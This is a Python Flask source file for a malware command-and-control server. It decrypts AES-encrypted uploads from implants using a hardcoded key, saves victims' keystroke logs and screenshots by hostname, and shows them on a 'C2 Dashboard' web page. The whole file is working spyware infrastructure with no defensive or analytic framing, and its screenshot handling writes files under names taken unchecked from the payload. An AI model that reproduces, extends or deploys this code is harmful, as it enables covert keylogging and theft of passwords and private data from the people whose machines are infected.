from flask import Flask, request, jsonify, send_from_directory
import base64
import zlib
import json
from Crypto.Cipher import AES
import os
import datetime

app = Flask(__name__)

# Create directories
BASE_DIR = "c2_data"
for d in [f"{BASE_DIR}/logs", f"{BASE_DIR}/keys", f"{BASE_DIR}/screenshots"]:
    os.makedirs(d, exist_ok=True)

KEY = b'0123456789ABCDEF0123456789ABCDEF'
IV = b'0123456789ABCDEF'

def decrypt_data(encrypted_b64):
    """Decrypt AES payload"""
    try:
        enc_bytes = base64.b64decode(encrypted_b64)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted_padded = cipher.decrypt(enc_bytes)
        
        # Remove PKCS7 padding
        padding_len = decrypted_padded[-1]
        decrypted = decrypted_padded[:-padding_len]
        
        # Decompress and parse JSON
        decompressed = zlib.decompress(decrypted).decode('utf-8')
        payload = json.loads(decompressed)
        return payload
    except Exception as e:
        print(f"Decrypt error: {e}")
        return None

@app.route("/receive", methods=["POST"])
def receive():
    try:
        data = request.json.get("data")
        if not data:
            return jsonify({"error": "No data"}), 400
        
        payload = decrypt_data(data)
        if not payload:
            return jsonify({"error": "Decrypt failed"}), 400
        
        # Save files
        session_id = payload.get("hostname", "unknown")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # JSON log
        log_file = f"c2_data/logs/session_{session_id}_{ts}.json"
        with open(log_file, "w") as f:
            json.dump(payload, f, indent=2)
        
        # Keylog
        keys = payload.get("keys", "")
        if keys:
            keys_file = f"c2_data/keys/keys_{session_id}_{ts}.txt"
            with open(keys_file, "w", encoding="utf-8") as f:
                f.write(keys)
        
        # Screenshots
        shots = payload.get("screenshot_data", [])
        for shot in shots:
            try:
                shot_file = f"c2_data/screenshots/{shot['filename']}"
                img_data = base64.b64decode(shot['data'])
                with open(shot_file, "wb") as f:
                    f.write(img_data)
            except Exception as e:
                print(f"Shot save error: {e}")
        
        print(f"✅ RECEIVED: {session_id} | {len(keys)} keys | {len(shots)} shots")
        return jsonify({"status": "ok", "keys": len(keys), "shots": len(shots)})
        
    except Exception as e:
        print(f"Receive error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route("/")
def dashboard():
    import os
    shots = [f for f in os.listdir("c2_data/screenshots") if f.endswith('.png')]
    keylogs = [f for f in os.listdir("c2_data/keys") if f.endswith('.txt')]
    
    html = f"""
<!DOCTYPE html>
<html><head><title>C2 Dashboard</title>
<style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}h1{{color:lime}}img{{max-width:300px;margin:10px;border:2px solid lime}}</style></head>
<body>
<h1>🔥 C2 Dashboard</h1>
<h2>📸 Screenshots ({len(shots)})</h2>
{''.join([f'<a href="/shots/{f}"><img src="/shots/{f}" title="{f}"></a>' for f in sorted(shots)[-8:]])}
<h2>⌨️ Keylogs ({len(keylogs)})</h2>
{''.join([f'<a href="/keys/{f}" target="_blank">{f}</a><br>' for f in sorted(keylogs)[-5:]])}
<hr>🛑 Ctrl+Alt+Q = Stop | ESC = Delete
</body></html>
"""
    return html

@app.route("/shots/<path:fn>")
def serve_shot(fn):
    return send_from_directory("c2_data/screenshots", fn)

@app.route("/keys/<path:fn>")
def serve_key(fn):
    path = f"c2_data/keys/{fn}"
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre style='font-family:monospace;background:#000;color:lime;padding:20px;font-size:16px;white-space:pre-wrap'>{content.replace('<','&lt;').replace('>','&gt;')}</pre>"
    return "File not found", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))